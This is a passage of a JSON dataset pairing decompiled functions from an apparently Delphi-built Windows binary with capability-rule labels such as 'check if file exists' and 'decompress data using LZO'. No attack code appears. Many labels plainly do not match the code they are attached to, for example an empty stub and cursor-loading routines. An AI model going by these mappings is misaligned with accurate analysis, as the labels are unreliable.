iVar4 == 0; iVar4 = iVar4 + -1) {\n            }\n        }\n        uVar5 = iVar4;\n        uVar1 = CONCAT44((uVar6 >> 1) >> (uVar5 & 0x1f), \n                         (uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f) >> (uVar5 & 0x1f) |\n                         (uVar6 >> 1) << 0x20 - (uVar5 & 0x1f)) /\n                ((uVar7 >> 1 | bVar10 << 0x1f) >> (uVar5 & 0x1f) |\n                (uVar8 >> 1 | bVar10 << 0x1f) << 0x20 - (uVar5 & 0x1f));\n        iVar4 = uVar1;\n        iVar2 = (uVar1 & 0xffffffff) * uVar7;\n        uVar8 = (iVar2 >> 0x20) + (uVar8 & 0xfffffffe | bVar10) * iVar4;\n        uVar3 = iVar4 - (uVar6 < uVar8 || uVar6 - uVar8 < (uVar3 < iVar2));\n        uVar8 = 0;\n    }\n    return CONCAT44(((uVar8 ^ uVar9) - uVar9) - ((uVar3 ^ uVar9) < uVar9), (uVar3 ^ uVar9) - uVar9);\n}\n",
        "token_count": 743
    },
    "0041b540": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b540(code *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t in_ECX;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = in_EDX;\n    do {\n        var_10h = var_8h + in_ECX >> 1;\n        uVar3 = var_8h;\n        uVar4 = in_ECX;\n        do {\n            while (iVar2 = (*arg_8h)(),  iVar2 < 0) {\n                uVar3 = uVar3 + 1;\n            }\n            while (iVar2 = (*arg_8h)(),  0 < iVar2) {\n                uVar4 = uVar4 - 1;\n            }\n            if (uVar3 <= uVar4) {\n                fcn.0041b248();\n                uVar1 = uVar4;\n                if ((uVar3 != var_10h) && (uVar1 = var_10h,  uVar4 == var_10h)) {\n                    uVar1 = uVar3;\n                }\n                var_10h = uVar1;\n                uVar3 = uVar3 + 1;\n                uVar4 = uVar4 - 1;\n            }\n        } while (uVar3 <= uVar4);\n        if (var_8h < uVar4) {\n            fcn.0041b540(arg_8h);\n        }\n        var_8h = uVar3;\n    } while (uVar3 < in_ECX);\n    return;\n}\n",
        "token_count": 397
    },
    "0040be08": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be08(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    char **ppcVar2;\n    \n    ppcVar2 = arg_8h + -4;\n    pcVar1 = *ppcVar2;\n    while (**ppcVar2 == *(arg_8h + -5)) {\n        *ppcVar2 = *ppcVar2 + 1;\n    }\n    *(arg_8h + -0xc) = *ppcVar2 + (1 - pcVar1);\n    return;\n}\n",
        "token_count": 126
    },
    "0041d2bc": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d2bc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.00420604();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.004205d8();\n            if ((*(iVar2 + 0x24) & 4) != 0) {\n                iVar2 = fcn.0040676c();\n                fcn.00406928(iVar2 + 1);\n                uVar3 = fcn.004205d8();\n                iVar2 = fcn.0040676c();\n                *(*(arg_8h + -4) + -4 + iVar2 * 4) = uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "0041ec1c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ec1c(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041cc3c();\n        if (cVar1 != '\\0') break;\n        fcn.0041ecd0();\n    }\n    fcn.0041dcf8();\n    return;\n}\n",
        "token_count": 83
    },
    "0041ec74": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ec74(uint arg_8h)\n\n{\n    char cVar1;\n    \n    while( true ) {\n        cVar1 = fcn.0041cc3c();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041d034();\n        if (cVar1 - 2U < 3) {\n            fcn.0041ecd0();\n        }\n        fcn.0041f0dc();\n        while( true ) {\n            cVar1 = fcn.0041cc3c();\n            if (cVar1 != '\\0') break;\n            fcn.0041ee80();\n        }\n        fcn.0041dcf8();\n    }\n    fcn.0041dcf8();\n    return;\n}\n",
        "token_count": 175
    },
    "0042c7a0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.0042c7a0(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_8h_2;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    int32_t *var_1ch_2;\n    uchar *var_18h;\n    int32_t var_14h;\n    uchar *var_10h;\n    int32_t var_ch_2;\n    uint var_8h_3;\n    \n    iVar8 = 0;\n    iVar5 = (param_1 + 1) * -4;\n    var_10h = &stack0xffffffd4 + iVar5;\n    puVar2 = &stack0xffffffd4 + iVar5;\n    var_1ch_2 = in_EAX;\n    var_ch_2 = param_1;\n    do {\n        puVar6 = puVar2;\n        *(puVar6 + -4) = 0x42c7cf;\n        iVar3 = fcn.0040a868();\n        *(puVar6 + -4) = 0;\n        *(puVar6 + -8) = 0;\n        *(puVar6 + -0xc) = iVar3;\n        *(puVar6 + -0x10) = param_2;\n        *(puVar6 + -0x14) = 0;\n        *(puVar6 + -0x18) = 0;\n        *(puVar6 + -0x1c) = 0x42c7e0;\n        var_14h = sub.kernel32.dll_MultiByteToWideChar_1();\n        var_14h = var_14h + 1;\n        iVar5 = -(var_14h * 2 + 3U & 0xfffffffc);\n        var_18h = puVar6 + iVar5 + -0x18;\n        if (iVar8 == 0) {\n            *var_10h = puVar6 + iVar5 + -0x18;\n        }\n        else {\n            *(var_10h + (var_ch_2 - iVar8) * 4) = puVar6 + iVar5 + -0x18;\n            var_18h = puVar6 + iVar5 + -0x18;\n        }\n        *(puVar6 + iVar5 + -0x1c) = var_14h;\n        *(puVar6 + iVar5 + -0x20) = var_18h;\n        *(puVar6 + iVar5 + -0x24) = iVar3;\n        *(puVar6 + iVar5 + -0x28) = param_2;\n        *(puVar6 + iVar5 + -0x2c) = 0;\n        *(puVar6 + iVar5 + -0x30) = 0;\n        *(puVar6 + iVar5 + -0x34) = 0x42c825;\n        sub.kernel32.dll_MultiByteToWideChar_1();\n        *(var_18h + var_14h * 2 + -2) = 0;\n        param_2 = param_2 + iVar3 + 1;\n        iVar8 = iVar8 + 1;\n        puVar2 = puVar6 + iVar5 + -0x30;\n    } while (iVar8 != var_ch_2);\n    *(puVar6 + iVar5 + -0x34) = var_8h_2;\n    *(puVar6 + iVar5 + -0x38) = 0x42c844;\n    uVar4 = sub.kernel32.dll_GetThreadLocale_1();\n    *(puVar6 + iVar5 + -0x38) = uVar4;\n    *(puVar6 + iVar5 + -0x3c) = var_ch_2;\n    *(puVar6 + iVar5 + -0x40) = var_10h;\n    *(puVar6 + iVar5 + -0x44) = *0x494a08;\n    *(puVar6 + iVar5 + -0x48) = var_1ch_2;\n    pcVar1 = *(*var_1ch_2 + 0x14);\n    puVar7 = puVar6 + iVar5 + -0x4c;\n    *(puVar6 + iVar5 + -0x4c) = 0x42c85c;\n    iVar5 = (*pcVar1)();\n    if (iVar5 == -0x7ffdfffa) {\n        *(puVar7 + -4) = &stack0xfffffffc;\n        *(puVar7 + -8) = 0x42c869;\n        fcn.0042c76c(*(puVar7 + -4));\n    }\n    else {\n        *(puVar7 + -4) = 0x42c871;\n        fcn.0042bd80();\n    }\n    return;\n}\n",
        "token_count": 1147
    },
    "00436f58": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00436f58(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    \n    iVar1 = fcn.0040e8cc();\n    if (iVar1 != 0) {\n        fcn.00405a84();\n    }\n    return unaff_EBX & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 90
    },
    "0043ca74": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ca74(uint param_1, int32_t param_2)\n\n{\n    fcn.00454808();\n    *(param_2 + 0x24) = *(param_2 + 0x24) & 0xfffffffc;\n    return;\n}\n",
        "token_count": 64
    },
    "00452d20": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452d20(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418420();\n    fcn.00450324();\n    iVar1 = *(*(arg_8h + -8) + 8);\n    fcn.00418470(&var_20h, \n                 ((*(iVar1 + 0x58) - *(iVar1 + 0x50)) + *(*(*(arg_8h + -4) + 0x30) + 0x4c)) - *(*(arg_8h + -4) + 0x4c));\n    fcn.004501d4();\n    return;\n}\n",
        "token_count": 180
    },
    "0046c078": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c078(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int16_t in_CX;\n    int16_t in_DX;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX + -0x101 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX - 0x101U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_DX - 0x101U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX + -1 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX - 1U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_CX - 1U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xd) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h + -4 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 4;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h - 4U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = (arg_8h - 4U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xc;\n    }\n    iVar4 = 0;\n    puVar3 = 0x493eb8;\n    if (0 < arg_8h) {\n        do {\n            if (*(in_EAX + 0x16b8) < 0xe) {\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xa7a + *puVar3 * 4) << (*(in_EAX + 0x16b8) & 0x1f)\n                ;\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n            }\n            else {\n                uVar1 = *(in_EAX + 0xa7a + *puVar3 * 4);\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n            }\n            iVar4 = iVar4 + 1;\n            puVar3 = puVar3 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    fcn.0046b98c();\n    fcn.0046b98c();\n    return;\n}\n",
        "token_count": 1750
    },
    "00475fd8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00475fd8(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x475ff1;\n    fcn.004059cc();\n    puStack28 = 0x475ff9;\n    fcn.004059cc();\n    puStack28 = 0x476001;\n    fcn.004059cc();\n    uStack32 = 0x47608a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n    fcn.00405584();\n    fcn.00405530();\n    fcn.00405584();\n    fcn.00405584();\n    fcn.00405584();\n    uVar1 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.0048317c, uVar1, 0, arg_8h + -4);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x476091);\n    return;\n}\n",
        "token_count": 318
    },
    "00404124": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00404124(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "00440158": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t fcn.00440158(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    iVar1 = sub.user32.dll_GetParent();\n    while ((iVar1 != 0 && (uVar2 = sub.user32.dll_GetWindowLongA(iVar1, 0xffffffec),  (uVar2 & 0x80) == 0x80))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    if (iVar1 == 0) {\n        if (*(*0x499c1c + 0x44) != 0) {\n            uVar3 = fcn.004585f8(0xffffffec);\n            uVar2 = sub.user32.dll_GetWindowLongA(uVar3);\n            if ((uVar2 & 0x80) == 0) {\n                iVar1 = fcn.004585f8();\n                return iVar1;\n            }\n        }\n        iVar1 = *(*0x499c1c + 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 236
    },
    "004050e8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004050e8(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t **in_FS_OFFSET;\n    \n    if (*0x4977cc != NULL) {\n        ppiVar1 = *in_FS_OFFSET;\n        if (*0x4977cc == ppiVar1) {\n            *in_FS_OFFSET = **0x4977cc;\n            return;\n        }\n        for (; ppiVar1 != 0xffffffff; ppiVar1 = *ppiVar1) {\n            if (*ppiVar1 == *0x4977cc) {\n                *ppiVar1 = **0x4977cc;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00407644": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00407644(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040763c();\n    if (iVar1 != 0) {\n        if (*0x4917b8 == -1) {\n            fcn.00405470();\n        }\n        iVar1 = fcn.00407630();\n        if (iVar1 == 0) {\n            fcn.00405470();\n        }\n        else {\n            sub.kernel32.dll_TlsSetValue(*0x4917b8, iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0040a21c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040a21c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_ch;\n    iVar1 = sub.kernel32.dll_SetFilePointer_1();\n    if (iVar1 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 != 0) {\n            lpDistanceToMoveHigh = 0xffffffff;\n        }\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar1);\n}\n",
        "token_count": 139
    },
    "0040a26c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a26c(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "0040a290": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a290(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040a488": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a488(int32_t param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    *(param_1 + 0x18) = ~param_2 & 0x16;\n    uVar1 = fcn.004059dc(param_1 + 0x20);\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1(uVar1);\n    *(param_1 + 0x1c) = iVar2;\n    if (iVar2 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n    }\n    else {\n        iVar2 = fcn.0040a404();\n        if (iVar2 != 0) {\n            fcn.0040a4fc();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 188
    },
    "0040a4fc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0040a4fc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1c) != -1) {\n        sub.kernel32.dll_FindClose_1(*(in_EAX + 0x1c));\n        *(in_EAX + 0x1c) = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040d548": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d548(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x40d5ad;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    for (iVar2 = 1; *(iVar2 * 4 + 0x4978f0) != -1; iVar2 = iVar2 + 1) {\n        if (iVar2 == 7) goto code_r0x0040d597;\n    }\n    fcn.00405728();\n    uVar1 = fcn.00409f18();\n    *(iVar2 * 4 + 0x4978f0) = uVar1;\ncode_r0x0040d597:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40d5b4;\n    uStack24 = 0x40d5ac;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 271
    },
    "00418498": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00418498(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*in_EAX == -1) && (in_EAX[1] == -1)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "0041c70c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c70c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004198f4();\n    if (iVar1 != -1) {\n        fcn.0041978c();\n    }\n    iVar1 = fcn.004198f4();\n    if (iVar1 < 0) {\n        fcn.00419740();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0041caa0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0041caa0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004166e4();\n    if (iVar1 == -1) {\n        fcn.0041ca68();\n    }\n    return iVar1;\n}\n",
        "token_count": 61
    },
    "0043693c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0043693c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00436908();\n    if (iVar1 == -1) {\n        fcn.00433a94();\n    }\n    fcn.004367e4();\n    return;\n}\n",
        "token_count": 65
    },
    "004383f8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004383f8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_EDX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if ((in_EDX & 0x10) == 0) {\n        iVar1 = sub.user32.dll_GetMenuItemID();\n        if (iVar1 != -1) {\n            iVar3 = fcn.00437a24();\n        }\n    }\n    else {\n        sub.user32.dll_GetSubMenu();\n        iVar3 = fcn.00437a24();\n    }\n    if (iVar3 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0043bcdc();\n    }\n    return uVar2;\n}\n",
        "token_count": 183
    },
    "00443f14": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00443f14(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    *(in_EAX + 0x60) = uVar1;\n    iVar2 = -0x16;\n    do {\n        sub.user32.dll_LoadCursorA();\n        fcn.00443fd0();\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != -1);\n    return;\n}\n",
        "token_count": 126
    },
    "00444280": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00444280(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = 0;\n    if (param_2 != -1) {\n        for (puVar2 = *(in_EAX + 0x5c); (puVar2 != NULL && (param_2 != puVar2[1])); puVar2 = *puVar2) {\n        }\n        if (puVar2 == NULL) {\n            uVar1 = *(in_EAX + 0x60);\n        }\n        else {\n            uVar1 = puVar2[2];\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 164
    },
    "00448cdc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448cdc(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint himl;\n    uint var_4h;\n    \n    puStack68 = 0x448d07;\n    himl = param_2;\n    fcn.00418448(&fcn.00448cdc::var_28h, *(in_EAX + 0x30));\n    puStack68 = 0x448d0f;\n    fcn.00449978();\n    uStack72 = 0x448e75;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x448d29;\n    puStack68 = &stack0xfffffffc;\n    var_ch = fcn.004293dc();\n    uStack84 = 0x448e58;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = 0x448d48;\n    puStack80 = &stack0xfffffffc;\n    (**(*var_ch + 0x34))();\n    puStack92 = 0x448d56;\n    (**(*var_ch + 0x40))();\n    puStack92 = 0x448d62;\n    var_10h = fcn.004293dc();\n    uStack96 = 0x448e3b;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack92 = &stack0xfffffffc;\n    fcn.0042a7e0();\n    (**(*var_10h + 0x34))();\n    (**(*var_10h + 0x40))();\n    uStack104 = himl;\n    iVar1 = sub.comctl32.dll_ImageList_GetImageCount();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if ((param_1 == -1) || (iVar3 == param_1)) {\n                var_14h = fcn.004299b0();\n                fcn.0042535c();\n                uVar2 = fcn.00425714(0, 0, 0);\n                sub.comctl32.dll_ImageList_Draw(himl, iVar3, uVar2);\n                var_18h = fcn.004299b0();\n                fcn.0042535c();\n                fcn.00425714(0, 0, 0x10);\n                uStack104 = himl;\n                sub.comctl32.dll_ImageList_Draw();\n                fcn.004488ac();\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack104;\n    uStack96 = 0x448e42;\n    uStack100 = 0x448e3a;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 793
    },
    "00450124": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450124(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        fcn.00450cec();\n    }\n    if (param_2 == in_EAX[0xc]) {\n        fcn.004501d4();\n    }\n    else {\n        fcn.00451bf4();\n    }\n    if ((param_2 == 0) || (param_2 == -1)) {\n        (**(*in_EAX + 0x6c))();\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0046f744": {
        "rules": [
